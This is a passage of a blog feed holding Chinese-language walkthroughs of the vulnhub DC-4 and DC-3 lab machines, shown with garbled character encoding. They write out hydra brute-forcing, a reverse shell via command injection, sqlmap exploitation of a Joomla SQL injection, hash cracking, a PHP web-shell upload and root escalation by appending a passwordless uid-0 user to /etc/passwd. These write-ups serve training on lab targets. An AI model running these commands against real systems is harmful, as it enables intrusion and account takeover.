        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ DC-4 é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h2 id="é¶æœºåœ°å€"><a href="#é¶æœºåœ°å€" class="headerlink" title="é¶æœºåœ°å€"></a>é¶æœºåœ°å€</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">vulnhub DC-4</a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="NMAPæ‰«æå¾—åˆ°IPåœ°å€"><a href="#NMAPæ‰«æå¾—åˆ°IPåœ°å€" class="headerlink" title="NMAPæ‰«æå¾—åˆ°IPåœ°å€"></a>NMAPæ‰«æå¾—åˆ°IPåœ°å€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.133</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure><p>ä¸»æœºå‘ç°,ipåœ°å€ä¸º<code>192.168.147.133</code>,è¿›è¡Œè¯¦ç»†çš„æ‰«æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.147.133 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure><p>çœŸçš„åªå¼€å¯äº† <strong>22å’Œ80</strong> ä¸¤ä¸ªç«¯å£</p><h3 id="è®¿é—®ç½‘ç«™"><a href="#è®¿é—®ç½‘ç«™" class="headerlink" title="è®¿é—®ç½‘ç«™"></a>è®¿é—®ç½‘ç«™</h3><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324062452.png" alt="file"><br>ä¸€å‰¯å¯ä»¥çˆ†ç ´çš„æ ·å­,ç›´æ¥ä¸Š <code>rockyou</code> å­—å…¸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt  192.168.147.133 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.147.133   login: admin   password: happy</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†å¯†ç ,ç™»é™†è¿›å»,å¯ä»¥è¿è¡Œä¸‰ç§æŒ‡ä»¤<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324336037.png" alt="file"></p><p>å¯ä»¥æŠ“åŒ…ä¿®æ”¹æŒ‡ä»¤å†…å®¹,ä¹Ÿå¯ä»¥åœ¨å‰ç«¯ä¿®æ”¹htmlå…ƒç´ å†™ä¸Šåå¼¹shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586325632432.png" alt="file"><br>åœ¨æœ¬åœ°ç›‘å¬ä¹‹å<code>Run</code>å°±å¯ä»¥æ¥æ”¶åˆ°shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.133] 34932</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure><h3 id="ç™»å½•åˆ°jim"><a href="#ç™»å½•åˆ°jim" class="headerlink" title="ç™»å½•åˆ°jim"></a>ç™»å½•åˆ°jim</h3><p>æŒ¨ä¸ªè¿›å»çœ‹çœ‹æœ‰å•¥(åªæœ‰jimæœ‰ä¸œè¥¿)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls -al back*</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..</span><br><span class="line">-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak</span><br></pre></td></tr></table></figure><p>çœ‹åå­—å°±çŸ¥é“åº”è¯¥æ˜¯å¤‡ä»½çš„æ—§å¯†ç ,æœ¬åœ°ä¿å­˜ä¹‹åæ‹¿å»ç”¨<code>hydra</code>çˆ†ç ´ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P password.txt ssh://192.168.147.133:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.147.133   login: jim   password: jibril04</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ä¹‹åè¿æ¥ä¸Šå»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.147.133</span><br><span class="line">jim@192.168.147.133&#39;s password:</span><br><span class="line"></span><br><span class="line">You have mail.</span><br><span class="line">jim@dc-4:~$ whoami</span><br><span class="line">jim</span><br></pre></td></tr></table></figure><h3 id="åˆ‡æ¢åˆ°charles"><a href="#åˆ‡æ¢åˆ°charles" class="headerlink" title="åˆ‡æ¢åˆ°charles"></a>åˆ‡æ¢åˆ°charles</h3><p>ä»–è¯´æœ‰ä¸€ä¸ªé‚®ä»¶,ç”¨<code>mail</code>å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹é‚®ä»¶çš„è·¯å¾„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:/var$ mail</span><br><span class="line">Mail version 8.1.2 01/15/2001.  Type ? for help.</span><br><span class="line">&quot;/var/mail/jim&quot;: 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays</span></span><br><span class="line">&amp; Held 1 message in /var/mail/jim</span><br><span class="line"></span><br><span class="line">cat /var/mail/jim</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç»™å¯†ç ,è¿™ä¹Ÿå¤ªæ£’äº†</p><h3 id="ææƒåˆ°root"><a href="#ææƒåˆ°root" class="headerlink" title="ææƒåˆ°root"></a>ææƒåˆ°root</h3><p>åˆ‡æ¢åˆ°<code>charles</code>ç”¨æˆ·,æŸ¥æ‰¾ä¸€ä¸‹èƒ½å¤Ÿææƒçš„ä¸œè¥¿</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">charles@dc-4:/var$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å•¥æŒ‡ä»¤,ä¸çŸ¥é“,çœ‹ä¸€ä¸‹help</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">teehee --help</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™æ¡,å¯ä»¥å†™æ–‡ä»¶,å¹¶ä¸”æ˜¯å¯ä»¥<code>sudo</code>çš„,å°±ç”¨å®ƒææƒäº†(å…¶å®æˆ‘ä¸çŸ¥é“è¿™é‡Œæ€ä¹ˆææƒ,ç™¾åº¦äº†èµ„æ–™)</p><p>æœ‰ä¸¤ç§åŠæ³•,ç¬¬ä¸€ç§æ˜¯åœ¨<code>/etc/passwd</code>é‡Œé¢è¿½åŠ ä¸€ä¸ªç”¨æˆ·,å’Œ<code>root</code>çš„æƒé™ä¸€æ ·,ç¬¬äºŒç§æ˜¯ä¿®æ”¹å®šæ—¶ä»»åŠ¡<br>æˆ‘ç”¨çš„æ˜¯ç¬¬ä¸€ç§</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:/var$ echo &quot;shiroha::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ cat /etc/passwd | grep &quot;shiroha&quot;</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ su shiroha</span><br><span class="line">root@dc-4:/var# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@dc-4:/var# cat /root/</span><br><span class="line">.bash_history  .bashrc        flag.txt       .nano/         .profile       </span><br><span class="line">root@dc-4:/var# cat /root/flag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> enum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-3é¶æœº</title>
      <link href="/DC-3.html"/>
      <url>/DC-3.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ DC-3 é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h2 id="é¶æœºåœ°å€"><a href="#é¶æœºåœ°å€" class="headerlink" title="é¶æœºåœ°å€"></a>é¶æœºåœ°å€</h2><p><a href="https://www.vulnhub.com/entry/dc-3,312/">vulnhub DC-3</a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="NMAPæ‰«æå¾—åˆ°ipåœ°å€"><a href="#NMAPæ‰«æå¾—åˆ°ipåœ°å€" class="headerlink" title="NMAPæ‰«æå¾—åˆ°ipåœ°å€"></a>NMAPæ‰«æå¾—åˆ°ipåœ°å€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.132</span><br><span class="line">Host is up (0.00074s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:44:28:03 (VMware)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°é¶æœºçš„ipåœ°å€ä¸º<code>192.168.147.132</code><br>è¿›è¡Œæ›´åŠ è¯¦ç»†çš„æ‰«æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.147.132 -p0-65535</span><br><span class="line">Nmap scan report for 192.168.147.132                                                                                 </span><br><span class="line">Host is up (0.0026s latency).                                                                                        </span><br><span class="line">Not shown: 65535 closed ports                                                                                        </span><br><span class="line">PORT   STATE SERVICE VERSION                                                                                         </span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                  </span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management                                                           </span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:44:28:03 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.62 ms 192.168.147.132</span><br></pre></td></tr></table></figure><p>åªæ‰¾åˆ°ä¸€ä¸ª<code>http(80ç«¯å£)</code>,å¾—çŸ¥æ˜¯ä¸€ä¸ª<a href="https://baike.baidu.com/item/joomla/3104596?fr=aladdin"><code>Joomla</code></a></p><h3 id="é’ˆå¯¹Joomlaçš„æ”»å‡»"><a href="#é’ˆå¯¹Joomlaçš„æ”»å‡»" class="headerlink" title="é’ˆå¯¹Joomlaçš„æ”»å‡»"></a>é’ˆå¯¹Joomlaçš„æ”»å‡»</h3><p>ä½¿ç”¨<a href="https://www.freebuf.com/sectool/181440.html">Joomscan</a>å·¥å…·æ‰«æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl --url http://192.168.147.132</span><br><span class="line"></span><br><span class="line">Processing http://192.168.147.132 ...</span><br><span class="line"></span><br><span class="line">[+] FireWall Detector                                                        </span><br><span class="line">[++] Firewall not detected                                                   </span><br><span class="line">                                                                             </span><br><span class="line">[+] Detecting Joomla Version                                                 </span><br><span class="line">[++] Joomla 3.7.0                                                            </span><br><span class="line">                                                                             </span><br><span class="line">[+] Core Joomla Vulnerability                                                </span><br><span class="line">[++] Target Joomla core is not vulnerable                                    </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking Directory Listing                                               </span><br><span class="line">[++] directory has directory listing :                                       </span><br><span class="line">http://192.168.147.132/administrator/components                              </span><br><span class="line">http://192.168.147.132/administrator/modules                                 </span><br><span class="line">http://192.168.147.132/administrator/templates                               </span><br><span class="line">http://192.168.147.132/images/banners                                        </span><br><span class="line">                                                                             </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking apache info/status files                                        </span><br><span class="line">[++] Readable info/status files are not found                                </span><br><span class="line">                                                                             </span><br><span class="line">[+] admin finder                                                             </span><br><span class="line">[++] Admin page : http://192.168.147.132/administrator/                      </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking robots.txt existing                                             </span><br><span class="line">[++] robots.txt is not found                                                 </span><br><span class="line">                                                                             </span><br><span class="line">[+] Finding common backup files name                                         </span><br><span class="line">[++] Backup files are not found                                              </span><br><span class="line">                                                                             </span><br><span class="line">[+] Finding common log files name                                            </span><br><span class="line">[++] error log is not found                                                  </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking sensitive config.php.x file                                     </span><br><span class="line">[++] Readable config files are not found                              </span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†<code>admin</code>çš„ç™»å½•é¡µé¢,å¹¶ä¸”å¾—å‡ºç‰ˆæœ¬ä¸º<code>Joomla 3.7.0</code></p><p>ä½†æ˜¯ç°åœ¨æ²¡æœ‰<code>admin</code>çš„å¯†ç ,ä½¿ç”¨<code>searchsploit</code>å·¥å…·æŸ¥æ‰¾<code>Joomla 3.7.0</code>å­˜åœ¨çš„æ¼æ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br><span class="line">------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                      |  Path</span><br><span class="line">                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------ ----------------------------------------</span><br><span class="line">Joomla! 3.7.0 - &#x27;com_fields&#x27; SQL In | exploits/php/webapps/42033.txt</span><br><span class="line">------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ª<code>SQL æ³¨å…¥</code>æ¼æ´,å¹¶ä¸”ç»™å‡ºäº†exp(ä¿¡æ¯å¤ªå¤šäº†ä¸å…¨éƒ¨å†™å‡º,åªç»™å‡ºå…³é”®ä¿¡æ¯)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: 05-19-2017</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥ç”¨<code>sqlmap</code>ä¸€æŠŠæ¢­</p><h3 id="sqlmap-æ³¨å…¥sql"><a href="#sqlmap-æ³¨å…¥sql" class="headerlink" title="sqlmap æ³¨å…¥sql"></a>sqlmap æ³¨å…¥sql</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure><p>å¾—å‡ºäº†æ•°æ®åº“,ç„¶åè¯»å–æ•°æ®è¡¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br><span class="line"></span><br><span class="line">***********************</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p>å¾—å‡ºæ•°æ®è¡¨ä¹‹åè„±å‡ºæ•°æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__uesr&quot; --dump -p list[fullordering]</span><br><span class="line"></span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line">| id   | email                    | name   | params                                                                                       | username | password                                                     |</span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line">| 629  | freddy@norealaddress.net | admin  | &#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;timezone&quot;:&quot;&quot;&#125; | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†åŠ å¯†ä¹‹åçš„adminçš„å¯†ç <br>ä¿å­˜è¿›æ–‡ä»¶ä¹‹åä½¿ç”¨<code>john</code>å·¥å…·çˆ†ç ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">john admin.txt</span><br><span class="line"></span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ä¹‹åç™»é™†è¿›å»</p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>å…ˆæŸ¥çœ‹æ¨¡æ¿çš„åç§°,åœ¨<code>Extensions-&gt;Templetes</code> çœ‹åˆ°æ˜¯<code>beez3</code>æ¨¡æ¿,ç‚¹è¿›å»ä¹‹åçœ‹åˆ°æ–‡ä»¶å¤¹,å¹¶ä¸”å¯ä»¥ä¸Šä¼ æ–‡ä»¶<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586230888126.png" alt="file"></p><p>ä¸Šä¼ åå¼¹shell<br><code>/usr/share/webshells/php/php-reverse-shell.php</code>,ä¿®æ”¹ä¸€ä¸‹å‚æ•°</p><p>åœ¨åœ°å€æ è®¿é—®<code>http://192.168.147.132/templates/beez3/html</code><br>åœ¨æœ¬åœ°ç›‘å¬ç«¯å£,æ‰¾åˆ°åˆšåˆšä¸Šä¼ çš„shell,å¹¶ä¸”è¿è¡Œ<br>è·å¾—ä¸€ä¸ªshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-3# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span 